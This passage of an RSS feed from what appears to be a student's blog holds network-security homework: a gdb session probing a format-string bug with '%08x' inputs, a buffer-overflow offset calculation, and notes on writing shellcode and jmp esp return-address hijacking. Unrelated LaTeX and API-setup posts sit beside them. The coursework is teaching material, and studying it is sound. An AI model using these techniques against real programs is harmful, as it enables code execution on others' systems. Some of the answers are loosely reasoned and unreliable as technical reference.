style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000132b &amp;lt;+254&amp;gt;:   mov    -0xc&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000132e &amp;lt;+257&amp;gt;:   xor    %gs:0x14,%eax&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001335 &amp;lt;+264&amp;gt;:   je     0x133c &amp;lt;formatstr_vul+271&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001337 &amp;lt;+266&amp;gt;:   call   0x13f0 &amp;lt;__stack_chk_fail_local&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000133c &amp;lt;+271&amp;gt;:   mov    -0x4&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%ebp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%ebx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x0000133f &amp;lt;+274&amp;gt;:   leave  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   0x00001340 &amp;lt;+275&amp;gt;:   ret    &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;End of assembler dump.&#xA;&lt;code&gt;(gdb) b *(formatstr_vul+191)&lt;/code&gt;&#xA;Breakpoint 1 at 0x12ec&#xA;(gdb) r&#xA;Starting program: /home/azureuser/hw/v2&#xA;&lt;!-- raw HTML omitted --&gt;&amp;amp;A=0xffffcde0   &amp;amp;B=0xffffcde4   C=0xffffcde8.&lt;!-- raw HTML omitted --&gt;&#xA;A=0x3435        B=0x5657        C=0x7879.&#xA;Please enter a string:&#xA;ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络安全作业6</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/</link>
      <pubDate>Wed, 13 Dec 2023 21:46:25 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/</guid>
      <description>&lt;h2 id=&#34;第九章&#34;&gt;第九章&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;简述shellcode 的概念以及编写shellcode的步骤。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;shellcode是注入到目标进程中的二进制代码，其功能取决于编写者的意图。&lt;/li&gt;&#xA;&lt;li&gt;编写shellcode要经过以下3个步骤：&#xA;&lt;ol&gt;&#xA;&lt;li&gt;编写简洁的能完成所需功能的C程序；&lt;/li&gt;&#xA;&lt;li&gt;反汇编可执行代码，用系统功能调用代替函数调用，用汇编语言实现相同的功能；&lt;/li&gt;&#xA;&lt;li&gt;提取出操作码，写成shellcode，并用C程序验证。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Linux环境下的shellcode为什么不调用libc中的库函数，而是利用系统调用？&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;通过系统调用可以直接访问系统内核，具有非常强大的功能。&lt;/li&gt;&#xA;&lt;li&gt;Shellcode 通常需要尽可能小，以便能够有效地注入到受限的内存空间或数据流中。直接使用系统调用比调用 libc 函数占用更少的空间，因为这避免了链接和加载整个库的开销。&lt;/li&gt;&#xA;&lt;li&gt;在安全测试和渗透测试中，shellcode 需要尽可能隐蔽地执行。直接使用系统调用可能帮助绕过一些安全监测工具和防御机制，因为它们更多地关注对常见库函数的调用。&lt;/li&gt;&#xA;&lt;li&gt;直接使用系统调用可以使shellcode更加独立和可移植。因为libc的版本和实现在不同的系统和环境中可能会有所不同，依赖于特定版本的libc函数可能会导致shellcode在某些环境下无法正常工作。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;在攻击字符串中4字节的RET除了其取在攻击字符串中4字节的RET除了其取值范围要猜测准确外，还有什么需要考虑的（或者说有什么限制）？&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;地址空间布局随机化&lt;/strong&gt;，现代操作系统采用了地址随机化技术，缓冲区的起始地址是会动态变化的，必须在攻击串中放置足够多的NOP，以使得RET的取值范围足够大，才能猜测一个正确的RET。&lt;/li&gt;&#xA;&lt;li&gt;RET指令的返回地址是函数返回时要跳转到的地址。如果返回地址指向了程序的不可执行代码区域，则攻击也将失败。&lt;/li&gt;&#xA;&lt;li&gt;一些程序可能会使用栈保护来防止溢出攻击。例如，程序可能会设置栈的大小限制，或者使用栈保护指令来检查栈是否溢出。&lt;/li&gt;&#xA;&lt;li&gt;RET指令的地址必须具有可写权限。如果RET指令的地址具有只读权限，则程序将无法修改该地址。&lt;/li&gt;&#xA;&lt;li&gt;如果RET地址包含零字节，那么在某些情况下，程序可能会提前终止字符串的处理，这可能会阻止攻击的进行。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;第十章&#34;&gt;第十章&lt;/h2&gt;&#xA;&lt;p&gt;&lt;strong&gt;简述进程跳转攻击方法的基本思想&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;从系统必须加载的动态链接库(如ntdll.dll，kernel32.dll)中寻找call esp和jmp esp指令，记录下该地址（溢出攻击的跳转地址），将该地址覆盖函数的返回地址，而将shellcode放在返回地址所在单元的后面。&lt;/li&gt;&#xA;&lt;li&gt;这样就确保溢出后通过动态链接库中的指令而跳转到被注入到进程堆栈中的shellcode。&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>网络安全作业5</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/</link>
      <pubDate>Fri, 24 Nov 2023 15:55:04 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/</guid>
      <description>&lt;p&gt;得分：10/10&lt;/p&gt;&#xA;&lt;p&gt;C程序homework08.c的主函数如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; argv[]) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;init_buf&lt;/span&gt;(Lbuffer, LEN);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt;(argc)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f00&lt;/span&gt;(); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f01&lt;/span&gt;(); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f02&lt;/span&gt;(); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f00&lt;/span&gt;(); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The program exited normally.&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;在32位的ubuntu16.04系统中用&lt;code&gt;gcc -fno-stack-protector&lt;/code&gt; 编译该程序，得到的可执行程序见附件，通过gdb调试，对f00()、f01()和f02()进行分析：&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;1-函数f00f01和f02是否导致段错误&#34;&gt;(1) 函数f00()、f01()和f02()是否导致段错误。&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;如果没有命令行参数（argc 等于 1，因为程序名本身也算一个参数），则执行函数 f00()。&lt;/li&gt;&#xA;&lt;li&gt;如果有一个命令行参数（argc 等于 2），则执行函数 f01()。&lt;/li&gt;&#xA;&lt;li&gt;如果有两个命令行参数（argc 等于 3），则执行函数 f02()。&lt;/li&gt;&#xA;&lt;li&gt;如果有三个或更多的命令行参数，还是执行函数 f00()。&#xA;![[Pasted image 20231122231415.png]]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;函数&lt;code&gt;foo()&lt;/code&gt;, 和 &lt;code&gt;foo01()&lt;/code&gt; 都会导致段错误。&lt;/p&gt;&#xA;&lt;h2 id=&#34;如果函数f00f01和f02导致段错误计算出被攻击的缓冲区首地址与函数的返回地址所在的栈地址的距离即偏移offset给出溢出后函数的返回地址用16进制数表示&#34;&gt;如果函数f00()、f01()和f02()导致段错误，计算出被攻击的缓冲区首地址与函数的返回地址所在的栈地址的距离（即偏移OFFSET)，给出溢出后函数的返回地址(用16进制数表示)。&lt;/h2&gt;&#xA;&lt;h3 id=&#34;f00&#34;&gt;f00()&lt;/h3&gt;&#xA;&lt;p&gt;![[Pasted image 20231121150016.png]]&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.ve6ptabwmds.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;打断点&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.603yb87syfb4.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4qt3dkn4xl6o.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;函数入口处的堆栈指针esp指向的栈（地址为&lt;strong&gt;0xffffd1dc&lt;/strong&gt;）保存了&#xA;函数f00()返回到调用函数(main)的地址（&lt;strong&gt;0x080485a8&lt;/strong&gt;），即“函数的返回地址”&lt;/p&gt;&#xA;&lt;p&gt;记录堆栈指针esp的值，在此以A标记：&lt;!-- raw HTML omitted --&gt;A=$esp = 0xffffd1dc&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  x/x $esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xffffd1dc:     0x080485a8&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; c&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Continuing.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Breakpoint 2, 0x080484e9 in f00 &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1: x/i $eip&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; 0x80484e9 &amp;lt;f00+24&amp;gt;:  call   0x8048320 &amp;lt;strcpy@plt&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; x/x $esp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xffffd140:     0xffffd155&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xffffd144:     0x0804a060&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; x/x 0x0804a060&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x804a060 &amp;lt;Lbuffer&amp;gt;:    0x44434241&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;令B = 0xffffd155，则&lt;!-- raw HTML omitted --&gt;offset=A-B=0xffffd1dc - 0xffffd155 =0x87=135&lt;!-- raw HTML omitted --&gt;。&lt;/p&gt;</description>
    </item>
    <item>
      <title>信网实验2</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C2/</link>
      <pubDate>Mon, 20 Nov 2023 10:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C2/</guid>
      <description>&lt;h2 id=&#34;基本操作&#34;&gt;基本操作&lt;/h2&gt;&#xA;&lt;h3 id=&#34;查看并记录-hosta-和-s-的-ipv6ens5-scopelink-地址&#34;&gt;查看并记录 HostA 和 S 的 IPv6(ens5 scope:link) 地址&lt;/h3&gt;&#xA;&lt;p&gt;命令 &lt;code&gt;ifconfig ens5&lt;/code&gt;。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.ldpjzb9l5jk.webp&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.1xxjljjl8azk.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;命令解释&#34;&gt;命令解释&lt;/h4&gt;&#xA;&lt;p&gt;&lt;code&gt;ifconfig&lt;/code&gt;是一个用于配置和显示Linux操作系统网络接口信息的命令。当执行&lt;code&gt;ifconfig ens5&lt;/code&gt;命令时，它会显示ens5网络接口的配置信息，包括IP地址、子网掩码、MAC地址、数据包统计等。&lt;/p&gt;&#xA;&lt;h3 id=&#34;ipv6-连接&#34;&gt;IPv6 连接：&lt;/h3&gt;&#xA;&lt;pre&gt;&lt;code&gt;HostA 的终端 1 中执行 `sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5`。&#xA;&#xA;HostA 的终端 2 中执行 `ping6 -c 1 S 的 IPv6(ens5 scope:link）地址%ens5`。&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.6do1erorr8jk.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.29ezt78rs9vk.webp&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4ifskyjvutfk.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;命令解释-1&#34;&gt;命令解释&lt;/h4&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;sudo tcpdump -vxn host HostA 的 IPv6(ens5 scope:link) 地址 and S 的 IPv6(ens5 scope:link）地址 -i ens5&lt;/code&gt; 这个命令的作用是使用tcpdump工具来捕获指定主机HostA和另一台主机S之间通过ens5网络接口的IPv6通信数据包。其中-v选项表示以详细模式显示数据包信息，-x选项表示以十六进制和ASCII形式显示数据包内容，-n选项表示以数字形式显示地址而不进行地址解析，-i ens5表示指定监听的网络接口为ens5。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Gpt Academic本地配置</title>
      <link>//localhost:64783/posts/gpt-academic%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sat, 18 Nov 2023 17:09:33 +0800</pubDate>
      <guid>//localhost:64783/posts/gpt-academic%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;项目地址 &lt;a href=&#34;https://github.com/binary-husky/gpt_academic&#34;&gt;GitHub - binary-husky/gpt_academic: 为ChatGPT/GLM提供实用化交互界面，特别优化论文阅读/润色/写作体验，模块化设计，支持自定义快捷按钮&amp;amp;函数插件，支持Python和C++等项目剖析&amp;amp;自译解功能，PDF/LaTex论文翻译&amp;amp;总结功能，支持并行问询多种LLM模型，支持chatglm2等本地模型。兼容文心一言, moss, llama2, rwkv, claude2, 通义千问, 书生, 讯飞星火等。&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;api配置&#34;&gt;api配置&lt;/h2&gt;&#xA;&lt;h3 id=&#34;openai-api&#34;&gt;openai-api&lt;/h3&gt;&#xA;&lt;p&gt;因为已经有了gpt账户，所以直接在&lt;a href=&#34;https://platform.openai.com/api-keys&#34;&gt;OpenAI Platform&lt;/a&gt;上生成一个key就可以了。注意这个key只能看一次。&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.6mcgr8hihls0.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;azure-api&#34;&gt;azure-api&lt;/h3&gt;&#xA;&lt;h4 id=&#34;注册&#34;&gt;注册&lt;/h4&gt;&#xA;&lt;p&gt;因为注册azure本身需要信用卡，本来不想注册的，突然看到一个博客说azure学生认证之后可以不需要信用卡，试了一下果然可以。注册之后秒通过，科大邮箱还是靠谱的。&#xA;注册可以参考&lt;a href=&#34;https://zhuanlan.zhihu.com/p/629311513&#34;&gt;学生福利白嫖之路——申请Azure学生订阅 - 知乎&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;配置&#34;&gt;配置&lt;/h4&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在搜索栏搜索Openai，然后创建&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.1vnx1e5dlh6o.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;请求访问Azure OpenAI服务&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.3qf86e6z2hz4.webp&#34; alt=&#34;image&#34;&gt;&#xA;然后填写问卷，第四个问题需要填写订阅ID，&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2lttofh1xxa8.webp&#34; alt=&#34;image&#34;&gt;&#xA;参考：&#xA;&lt;a href=&#34;https://learn.microsoft.com/zh-cn/azure/azure-portal/get-subscription-tenant-id&#34;&gt;获取 Azure 门户中的订阅和租户 ID - Azure portal | Microsoft Learn&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;填完问卷之后要等一段时间的审核&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.2o395d14pke8.webp&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;星火api&#34;&gt;星火api&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;登陆：&lt;a href=&#34;https://passport.xfyun.cn/login&#34;&gt;讯飞开放平台&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;点击免费试用：&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.4jxumhrrbg1s.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;实名认证获得更多token&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.3gt0zx6nhw00.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;前往&lt;a href=&#34;https://console.xfyun.cn/services/bm3&#34;&gt;控制台-讯飞开放平台&lt;/a&gt;获取自己的key&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.byp4zpdhe4w.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;输入到config.py中&#xA;注：需在这个列表添加&#xA;&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.27f7pzihlurk.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;智谱清言&#34;&gt;智谱清言&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;前往平台&lt;a href=&#34;https://maas.aminer.cn&#34;&gt;智谱AI开放平台&lt;/a&gt;登陆后前往&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.ox0uvcjqk4w.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;点击右上角查看apikey&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.8vj61b1wpig.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;li&gt;复制key输入config.py的这个部分：&lt;img src=&#34;https://cdn.statically.io/gh/Anonymity-0/Picgo@note_picture/img/image.53marrgqzqtc.webp&#34; alt=&#34;image&#34;&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;其他api不是需要自己部署就是收费，就不捣鼓了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>VScode配置Latex</title>
      <link>//localhost:64783/posts/vscode%E9%85%8D%E7%BD%AElatex/</link>
      <pubDate>Wed, 15 Nov 2023 21:32:47 +0800</pubDate>
      <guid>//localhost:64783/posts/vscode%E9%85%8D%E7%BD%AElatex/</guid>
      <description>&lt;p&gt;最近开始要写课程论文了，想着要用latex的模板直接写会方便，又懒得下overleaf，话不多说开始配置&lt;/p&gt;&#xA;&lt;h2 id=&#34;下载与安装&#34;&gt;下载与安装&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;可以从该镜像下载&#xA;[Index of CTAN-local/systems/texlive/Images](&lt;a href=&#34;https://mirrors.huaweicloud.com/CTAN/systems/texlive/Images/&#34;&gt;https://mirrors.huaweicloud.com/CTAN/systems/texlive/Images/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;mac用户可配置&lt;a href=&#34;https://tug.org/mactex/mactex-download.html&#34;&gt;MacTeX - TeX Users Group&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;安装vscode插件 &lt;code&gt;LaTeX Workshop&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;配置&#34;&gt;配置&lt;/h2&gt;&#xA;&lt;h3 id=&#34;配置latex-workshop&#34;&gt;配置latex-workshop&lt;/h3&gt;&#xA;&lt;p&gt;不包含外部 pdf 查看器设置的配置&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.latex.autoBuild.run&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;never&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;latex-workshop.showContextMenu&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span 